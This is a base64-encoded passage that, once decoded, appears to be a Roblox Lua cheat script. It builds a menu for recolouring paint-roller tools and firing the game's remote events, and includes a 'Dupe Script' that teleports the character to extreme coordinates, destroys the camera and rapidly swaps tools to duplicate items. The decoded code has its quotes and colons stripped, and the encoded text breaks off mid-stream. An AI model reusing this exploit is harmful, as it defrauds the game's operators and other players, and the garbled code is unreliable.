aykKICAgIGxvY2FsIExvY2FsUGxheWVyID0gZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIGJhY2twYWNrID0gTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgIGxvY2FsIGNoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgoKICAgIGxvY2FsIGZ1bmN0aW9uIHVuZXF1aXBUb29scygpCiAgICAgICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKGNoYXJhY3RlckdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIHRvb2xJc0EoVG9vbCkgYW5kIHRvb2wuTmFtZSA9PSBQYWludFJvbGxlciB0aGVuCiAgICAgICAgICAgICAgICB0b29sLlBhcmVudCA9IGJhY2twYWNrCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gZXF1aXBUb29scygpCiAgICAgICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKGJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgdG9vbElzQShUb29sKSBhbmQgdG9vbC5OYW1lID09IFBhaW50Um9sbGVyIHRoZW4KICAgICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gY2hhcmFjdGVyCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCgogICAgdW5lcXVpcFRvb2xzKCkKICAgIHdhaXQoMC43KQogICAgaWYgY2FsbGJhY2sgdGhlbiBjYWxsYmFjaygpIGVuZAogICAgd2FpdCgwLjcpCiAgICBlcXVpcFRvb2xzKCkKZW5kCgotLSBEcm9wZG93biB0byBzZWxlY3QgdGhlIGNvbG9yClRvb2xzVGFiQWRkRHJvcGRvd24oewogICAgTmFtZSA9IFNlbGVjdCBDb2xvciwKICAgIERlc2NyaXB0aW9uID0gQ2hvb3NlIGEgY29sb3IgdG8gYXBwbHksCiAgICBPcHRpb25zID0gKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBjb2xvck5hbWVzID0ge30KICAgICAgICBmb3IgXywgY29sb3IgaW4gaXBhaXJzKGNvbG9yc1RhYmxlKSBkbwogICAgICAgICAgICB0YWJsZS5pbnNlcnQoY29sb3JOYW1lcywgY29sb3IuTmFtZSkKICAgICAgICBlbmQKICAgICAgICByZXR1cm4gY29sb3JOYW1lcwogICAgZW5kKSgpLAogICAgRGVmYXVsdCA9IGNvbG9yc1RhYmxlWzFdLk5hbWUsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHNlbGVjdGVkKQogICAgICAgIGZvciBfLCBjb2xvciBpbiBpcGFpcnMoY29sb3JzVGFibGUpIGRvCiAgICAgICAgICAgIGlmIGNvbG9yLk5hbWUgPT0gc2VsZWN0ZWQgdGhlbgogICAgICAgICAgICAgICAgc2VsZWN0ZWRDb2xvciA9IGNvbG9yLkNvbG9yCiAgICAgICAgICAgICAgICBlcXVpcEFuZFVuZXF1aXBUb29scyhhcHBseVNlbGVjdGVkQ29sb3IpCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gRnVuY3Rpb24gdG8gYXBwbHkgUkdCIGN5Y2xlCmxvY2FsIGZ1bmN0aW9uIGFwcGx5UkdCQ3ljbGUoKQogICAgbG9jYWwgTG9jYWxQbGF5ZXIgPSBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllcgogICAgbG9jYWwgYmFja3BhY2sgPSBMb2NhbFBsYXllci5CYWNrcGFjawogICAgbG9jYWwgY2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICBsb2NhbCB0b29sSW5kZXggPSAwCiAgICBsb2NhbCB0b3RhbENvbG9ycyA9ICNjb2xvcnNUYWJsZQoKICAgIGxvY2FsIGZ1bmN0aW9uIGNoYW5nZVRvb2xDb2xvcih0b29sLCBjb2xvcikKICAgICAgICBpZiB0b29sSXNBKFRvb2wpIGFuZCB0b29sLk5hbWUgPT0gUGFpbnRSb2xsZXIgdGhlbgogICAgICAgICAgICBsb2NhbCBTZXRDb2xvciA9IHRvb2xGaW5kRmlyc3RDaGlsZChTZXRDb2xvciwgdHJ1ZSkKICAgICAgICAgICAgaWYgU2V0Q29sb3IgdGhlbgogICAgICAgICAgICAgICAgU2V0Q29sb3JGaXJlU2VydmVyKGNvbG9yKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhiYWNrcGFja0dldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbC5OYW1lID09IFBhaW50Um9sbGVyIHRoZW4KICAgICAgICAgICAgdG9vbEluZGV4ID0gdG9vbEluZGV4ICsgMQogICAgICAgICAgICBsb2NhbCBjb2xvciA9IGNvbG9yc1RhYmxlWyh0b29sSW5kZXggLSAxKSAlIHRvdGFsQ29sb3JzICsgMV0uQ29sb3IKICAgICAgICAgICAgY2hhbmdlVG9vbENvbG9yKHRvb2wsIGNvbG9yKQogICAgICAgIGVuZAogICAgZW5kCiAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMoY2hhcmFjdGVyR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB0b29sLk5hbWUgPT0gUGFpbnRSb2xsZXIgdGhlbgogICAgICAgICAgICB0b29sSW5kZXggPSB0b29sSW5kZXggKyAxCiAgICAgICAgICAgIGxvY2FsIGNvbG9yID0gY29sb3JzVGFibGVbKHRvb2xJbmRleCAtIDEpICUgdG90YWxDb2xvcnMgKyAxXS5Db2xvcgogICAgICAgICAgICBjaGFuZ2VUb29sQ29sb3IodG9vbCwgY29sb3IpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgotLSBCdXR0b24gdG8gYXBwbHkgY29sb3IgY3ljbGUKVG9vbHNUYWJBZGRCdXR0b24oewogICAgTmFtZSA9IFJhaW5ib3csCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBlcXVpcEFuZFVuZXF1aXBUb29scyhhcHBseVJHQkN5Y2xlKQogICAgZW5kCn0pCgotLSBDb2xvciBjb21iaW5hdGlvbnMKbG9jYWwgY29sb3JDb21iaW5hdGlvbnMgPSB7fQpmb3IgaSwgY29sb3IxIGluIGlwYWlycyhjb2xvcnNUYWJsZSkgZG8KICAgIGZvciBqLCBjb2xvcjIgaW4gaXBhaXJzKGNvbG9yc1RhYmxlKSBkbwogICAgICAgIGlmIGkgfj0gaiB0aGVuCiAgICAgICAgICAgIHRhYmxlLmluc2VydChjb2xvckNvbWJpbmF0aW9ucywge05hbWUgPSBjb2xvcjEuTmFtZSAuLiAgYW5kICAuLiBjb2xvcjIuTmFtZSwgQ29sb3JzID0ge2NvbG9yMS5Db2xvciwgY29sb3IyLkNvbG9yfX0pCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgotLSBEcm9wZG93biBmb3IgY29sb3IgY29tYmluYXRpb25zClRvb2xzVGFiQWRkRHJvcGRvd24oewogICAgTmFtZSA9IFNlbGVjdCBDb2xvciBDb21iaW5hdGlvbiwKICAgIERlc2NyaXB0aW9uID0gQ2hvb3NlIGEgY29sb3IgY29tYmluYXRpb24sCiAgICBPcHRpb25zID0gKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBjb21iaW5hdGlvbk5hbWVzID0ge30KICAgICAgICBmb3IgXywgY29tYmluYXRpb24gaW4gaXBhaXJzKGNvbG9yQ29tYmluYXRpb25zKSBkbwogICAgICAgICAgICB0YWJsZS5pbnNlcnQoY29tYmluYXRpb25OYW1lcywgY29tYmluYXRpb24uTmFtZSkKICAgICAgICBlbmQKICAgICAgICByZXR1cm4gY29tYmluYXRpb25OYW1lcwogICAgZW5kKSgpLAogICAgRGVmYXVsdCA9IGNvbG9yQ29tYmluYXRpb25zWzFdLk5hbWUsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHNlbGVjdGVkKQogICAgICAgIGZvciBfLCBjb21iaW5hdGlvbiBpbiBpcGFpcnMoY29sb3JDb21iaW5hdGlvbnMpIGRvCiAgICAgICAgICAgIGlmIGNvbWJpbmF0aW9uLk5hbWUgPT0gc2VsZWN0ZWQgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgZnVuY3Rpb24gYXBwbHlEb3VibGVDb2xvcigpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgTG9jYWxQbGF5ZXIgPSBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllcgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGJhY2twYWNrID0gTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICBsb2NhbCB0b29sSW5kZXggPSAwCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY29sb3JzID0gY29tYmluYXRpb24uQ29sb3JzCgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIGNoYW5nZVRvb2xDb2xvcih0b29sLCBjb2xvcikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbElzQShUb29sKSBhbmQgdG9vbC5OYW1lID09IFBhaW50Um9sbGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFNldENvbG9yID0gdG9vbEZpbmRGaXJzdENoaWxkKFNldENvbG9yLCB0cnVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgU2V0Q29sb3IgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNldENvbG9yRmlyZVNlcnZlcihjb2xvcikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKGJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbC5OYW1lID09IFBhaW50Um9sbGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xJbmRleCA9IHRvb2xJbmRleCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGNvbG9yID0gY29sb3JzWyh0b29sSW5kZXggLSAxKSAlIDIgKyAxXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hhbmdlVG9vbENvbG9yKHRvb2wsIGNvbG9yKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMoY2hhcmFjdGVyR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbC5OYW1lID09IFBhaW50Um9sbGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xJbmRleCA9IHRvb2xJbmRleCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGNvbG9yID0gY29sb3JzWyh0b29sSW5kZXggLSAxKSAlIDIgKyAxXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hhbmdlVG9vbENvbG9yKHRvb2wsIGNvbG9yKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZXF1aXBBbmRVbmVxdWlwVG9vbHMoYXBwbHlEb3VibGVDb2xvcikKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBSZWZlcmVuY2VzIHRvIHJlbW90ZXMKbG9jYWwgY2xlYXJ0b29scmVtb3RlID0gZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpLlJFRmluZEZpcnN0Q2hpbGQoMUNsZWExclRvb2wxcykKbG9jYWwgcGlja3Rvb2xyZW1vdGUgPSBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkuUkVGaW5kRmlyc3RDaGlsZCgxVG9vMWwpCgotLSBJdGVtIGNvbnRyb2wgc2VjdGlvbgpsb2NhbCBTZWN0aW9uID0gVG9vbHNUYWJBZGRTZWN0aW9uKHsKICAgIE5hbWUgPSBJdGVtcyBDb250cm9sCn0pCgotLSBCdXR0b24gdG8gY2xlYXIgYWxsIHRvb2xzClRvb2xzVGFiQWRkQnV0dG9uKHsKICAgIE5hbWUgPSBDbGVhciBBbGwgVG9vbHMsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICBbMV0gPSBDbGVhckFsbFRvb2xzCiAgICAgICAgfQogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKVdhaXRGb3JDaGlsZChSRSlXYWl0Rm9yQ2hpbGQoMUNsZWExclRvb2wxcylGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgIGVuZAp9KQoKLS0gU2VjdGlvbiB0byBlcXVpcCBpdGVtcwpTZWN0aW9uID0gVG9vbHNUYWJBZGRTZWN0aW9uKHsKICAgIE5hbWUgPSBFcXVpcCBJdGVtcwp9KQoKLS0gQnV0dG9uIHRvIGVxdWlwIGFsbCBpdGVtcwpUb29sc1RhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gRXF1aXAgYWxsIGl0ZW1zLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgZm9yIF8sIHRvb2wgaW4gcGFpcnMoZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiB0b29sSXNBKFRvb2wpIHRoZW4KICAgICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gU2VjdGlvbiBmb3IgQ3Jvc3MgR3JpcApTZWN0aW9uID0gVG9vbHNUYWJBZGRTZWN0aW9uKHsKICAgIE5hbWUgPSBDcm9zcyBHcmlwCn0pCgotLSBCdXR0b24gZm9yIEdpYW50IEpvdXN0IEJsdWUgQ3Jvc3MKVG9vbHNUYWJBZGRCdXR0b24oewogICAgTmFtZSA9IEdpYW50IEpvdXN0IEJsdWUgQ3Jvc3MsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgIHRvb2xzZWxjdGVkID0gSm91c3RCbHVlCiAgICAgICAgZHVwZWFtb3QgPSAxNzUgLS1QdXQgYW1vdXRoIHRvIGR1cGUKICAgICAgICBwaWNrdG9vbHJlbW90ZSA9IGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFUb28xbCkKICAgICAgICBjbGVhcnRvb2xyZW1vdGUgPSBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkuUkVGaW5kRmlyc3RDaGlsZCgxQ2xlYTFyVG9vbDFzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGR1cGluZyA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvbGRjZiA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKZ2FtZUdldFNlcnZpY2UoU3RhcnRlckd1aSlTZXRDb3JlKFNlbmROb3RpZmljYXRpb24se1RpdGxlPUR1cGUgU2NyaXB0LFRleHQ9UGxlYXNlIGRvIG5vdCBlcXVpcCBhbnkgdG9vbHMgb3IgdW5lcXVpcCB0b29scyBvciBjbGljayB0b29scyBvbiBpbnZlbnRvcnkuIEl0IHdpbGwgYnJlYWsgdGhlIHNjcmlwdC4sIEJ1dHRvbjEgPSBJIHVuZGVyc3RhbmQgLER1cmF0aW9uPTV9KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID09IHRydWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3YWl0KDAuMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKURlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBtPTEsMiBkbyB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgwLjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGFpZGosYWZoIGluIHBhaXJzKGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3RlckdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBhZmguTmFtZSA9PSB0b29sc2VsY3RlZCA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGFmaElzQShUb29sKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWZoLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBhaWVmaGlld2h3ZixkdmpidmogaW4gcGFpcnMoZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHZqYnZqSXNBKFRvb2wpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHZqYnZqLk5hbWUgPT0gdG9vbHNlbGN0ZWQgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGR2amJ2akRlc3Ryb3koKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0dGp0anV0anV0amp0aixkZHZkdmRzdmRmYnJueXR5dG12ZHYgaW4gcGFpcnMoZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRkdmR2ZHN2ZGZicm55dHl0bXZkdklzQShUb29sKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRkdmR2ZHN2ZGZicm55dHl0bXZkdi5uYW1lID09IHRvb2xzZWxjdGVkID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZHZkdmRzdmRmYnJueXR5dG12ZHZEZXN0cm95KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgZmluZGluLHRvb2xsZWwgaW4gcGFpcnMoZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2xsZWxJc0EoVG9vbCkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sbGVsLk5hbWUgPT0gdG9vbHNlbGN0ZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGxmb3VuMiA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgYmFzYyxhaWpmdyBpbiBwYWlycyh0b29sbGVsR2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGFpamZ3Lk5hbWUgPT0gSGFuZGxlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWlqZncuTmFtZSA9IEjiIKVh4iClbuIgpWTiIKVs4iClZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGVsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxlbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2xsbGxhaGhoaCA9IHRvb2xsZWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB0b29sbGxsZm91bjIgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBmaWlmaSx0b29sbGxsIGluIHBhaXJzKGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2xsbGxJc0EoVG9vbCkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sbGxsLk5hbWUgPT0gdG9vbHNlbGN0ZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGxmb3VuID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBuYW5hLGpqc2pzaiBpbiBwYWlycyh0b29sbGxsR2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGpqc2pzai5OYW1lID09IEhhbmRsZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgampzanNqLk5hbWUgPSBI4iClYeIgpW7iIKVk4iClbOIgpWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGZmZWwgPSB0b29sbGxsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB0b29sbGxsZm91biA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sbGxsZm91biA9PSB0cnVlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKHRvb2xsbGZmZWwpID09IG5pbCB0aGVuICB0b29sbGxsZm91biA9IGZhbHNlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKHRvb2xsbGZmZWwpID09IG5pbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGxmb3VuID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sbGxsZm91bjIgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgI